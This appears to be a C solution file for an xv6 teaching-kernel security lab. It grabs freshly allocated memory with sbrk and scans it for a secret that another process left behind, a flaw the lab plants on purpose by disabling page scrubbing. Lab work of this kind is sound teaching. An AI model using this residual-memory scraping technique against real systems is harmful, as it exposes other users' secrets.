#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

// secret.c writes the secret (prefixed by MSG) near the low end of the
// 9 pages it allocates with sbrk().  Because this lab omits the kernel
// code that scrubs freed/newly-allocated pages, those freed pages still
// hold the secret.  But sbrk() hands out physical pages from a free
// list that behaves like a stack: secret's low pages were freed first
// and sit deep in it, while the shell's fork and our own exec pile
// newer pages on top.  So we must allocate well more than 9 pages for
// our high addresses to reach back down to secret's pages.
#define NPAGES   64
#define DATASIZE (NPAGES * 4096)
#define MSG      "Here it is: "

int
main(int argc, char *argv[])
{
  // Grab the memory that secret.c freed when it exited.  With the page
  // scrubbing disabled for this lab, it may still hold the old data.
  char *data = sbrk(DATASIZE);
  if (data == SBRK_ERROR) {
    fprintf(2, "attack: sbrk failed\n");
    exit(1);
  }

  int msglen = strlen(MSG);

  // Scan the reclaimed memory for the marker, then print the
  // null-terminated string that follows it.
  for (int i = 0; i + msglen < DATASIZE; i++) {
    if (memcmp(data + i, MSG, msglen) != 0)
      continue;

    char *secret = data + i + msglen;

    // Confirm the secret is NUL-terminated within our mapped region
    // before printing it, so we never read past the allocation.
    int j, max = DATASIZE - (i + msglen);
    for (j = 0; j < max && secret[j] != '\0'; j++)
      ;
    if (j == max)
      continue; // no terminator here; keep scanning

    printf("%s\n", secret);
    exit(0);
  }

  exit(1);
}
